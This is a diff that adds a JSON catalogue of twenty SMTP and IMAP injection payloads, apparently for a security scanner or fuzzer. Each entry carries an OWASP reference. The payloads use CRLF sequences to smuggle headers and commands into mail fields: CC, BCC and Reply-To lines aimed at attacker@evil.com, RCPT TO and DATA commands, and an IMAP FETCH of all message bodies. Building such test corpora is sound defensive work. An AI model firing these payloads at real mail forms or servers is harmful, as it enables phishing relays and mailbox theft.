@@ -1,0 +1,122 @@
+[
+  {
+    "id": "proto-001", "family": "protocol_injection", "subtype": "smtp_injection",
+    "payload_string": "\\r\\nCC: attacker@evil.com", "context": "string",
+    "description": "SMTP Header Injection - CC field",
+    "references": ["https://owasp.org/www-community/attacks/SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-002", "family": "protocol_injection", "subtype": "smtp_injection",
+    "payload_string": "\\r\\nBCC: attacker@evil.com", "context": "string",
+    "description": "SMTP Header Injection - BCC field",
+    "references": ["https://owasp.org/www-community/attacks/SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-003", "family": "protocol_injection", "subtype": "smtp_injection",
+    "payload_string": "\\r\\nTo: victim@evil.com", "context": "string",
+    "description": "SMTP Header Injection - To field override",
+    "references": ["https://owasp.org/www-community/attacks/SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-004", "family": "protocol_injection", "subtype": "smtp_injection",
+    "payload_string": "\\r\\nSubject: [URGENT] Security Alert\\r\\n\\r\\nPlease reset your password.", "context": "string",
+    "description": "SMTP Header Injection - Subject and Body manipulation",
+    "references": ["https://owasp.org/www-community/attacks/SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-005", "family": "protocol_injection", "subtype": "smtp_injection",
+    "payload_string": "attacker@evil.com>\\r\\nRCPT TO:<victim@evil.com", "context": "string",
+    "description": "SMTP Command Injection - RCPT TO",
+    "references": ["https://owasp.org/www-community/attacks/SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-006", "family": "protocol_injection", "subtype": "smtp_injection",
+    "payload_string": "\\nCC: attacker@evil.com", "context": "string",
+    "description": "SMTP Header Injection (LF only) - CC field",
+    "references": ["https://owasp.org/www-community/attacks/SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-007", "family": "protocol_injection", "subtype": "smtp_injection",
+    "payload_string": "%0d%0aCC: attacker@evil.com", "context": "string",
+    "description": "SMTP Header Injection (URL Encoded) - CC field",
+    "references": ["https://owasp.org/www-community/attacks/SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-008", "family": "protocol_injection", "subtype": "smtp_injection",
+    "payload_string": "DATA\\r\\nSubject: Injected Subject\\r\\n\\r\\nInjected Body\\r\\n.\\r\\n", "context": "string",
+    "description": "SMTP Command Injection - DATA payload",
+    "references": ["https://owasp.org/www-community/attacks/SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-009", "family": "protocol_injection", "subtype": "smtp_injection",
+    "payload_string": "admin@localhost\\r\\nVRFY root", "context": "string",
+    "description": "SMTP Command Injection - VRFY command",
+    "references": ["https://owasp.org/www-community/attacks/SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-010", "family": "protocol_injection", "subtype": "smtp_injection",
+    "payload_string": "admin@localhost\\r\\nEXPN mailinglist", "context": "string",
+    "description": "SMTP Command Injection - EXPN command",
+    "references": ["https://owasp.org/www-community/attacks/SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-011", "family": "protocol_injection", "subtype": "imap_injection",
+    "payload_string": "a001 LOGIN user \"pass\"\\r\\n", "context": "string",
+    "description": "IMAP Command Injection - LOGIN",
+    "references": ["https://owasp.org/www-community/attacks/IMAP_SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-012", "family": "protocol_injection", "subtype": "imap_injection",
+    "payload_string": "\r\na002 SELECT INBOX\r\n", "context": "string",
+    "description": "IMAP Command Injection - SELECT INBOX",
+    "references": ["https://owasp.org/www-community/attacks/IMAP_SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-013", "family": "protocol_injection", "subtype": "imap_injection",
+    "payload_string": "\"\r\na003 FETCH 1:* (BODY[TEXT])\r\n\"", "context": "string",
+    "description": "IMAP Command Injection - FETCH emails",
+    "references": ["https://owasp.org/www-community/attacks/IMAP_SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-014", "family": "protocol_injection", "subtype": "imap_injection",
+    "payload_string": "%0d%0aa004 SEARCH ALL", "context": "string",
+    "description": "IMAP Command Injection (URL Encoded) - SEARCH",
+    "references": ["https://owasp.org/www-community/attacks/IMAP_SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-015", "family": "protocol_injection", "subtype": "imap_injection",
+    "payload_string": "\\r\\na005 LOGOUT\\r\\n", "context": "string",
+    "description": "IMAP Command Injection - LOGOUT",
+    "references": ["https://owasp.org/www-community/attacks/IMAP_SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-016", "family": "protocol_injection", "subtype": "imap_injection",
+    "payload_string": "INBOX\"\\r\\na006 CAPABILITY\\r\\n\"", "context": "string",
+    "description": "IMAP Command Injection - Breakout into CAPABILITY",
+    "references": ["https://owasp.org/www-community/attacks/IMAP_SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-017", "family": "protocol_injection", "subtype": "smtp_injection",
+    "payload_string": "\\n\\nFrom: attacker@evil.com", "context": "string",
+    "description": "SMTP Header Injection - From field override",
+    "references": ["https://owasp.org/www-community/attacks/SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-018", "family": "protocol_injection", "subtype": "smtp_injection",
+    "payload_string": "\\nReply-To: attacker@evil.com", "context": "string",
+    "description": "SMTP Header Injection - Reply-To field",
+    "references": ["https://owasp.org/www-community/attacks/SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-019", "family": "protocol_injection", "subtype": "imap_injection",
+    "payload_string": "\r\n* PREAUTH\r\n", "context": "string",
+    "description": "IMAP Server Response Injection - PREAUTH spoofing",
+    "references": ["https://owasp.org/www-community/attacks/IMAP_SMTP_Injection"], "platform_specific": {}
+  },
+  {
+    "id": "proto-020", "family": "protocol_injection", "subtype": "imap_injection",
+    "payload_string": "1\" OR \"1\"=\"1", "context": "string",
+    "description": "IMAP Filter Injection - Logical Bypass",
+    "references": ["https://owasp.org/www-community/attacks/IMAP_SMTP_Injection"], "platform_specific": {}
+  }
+]
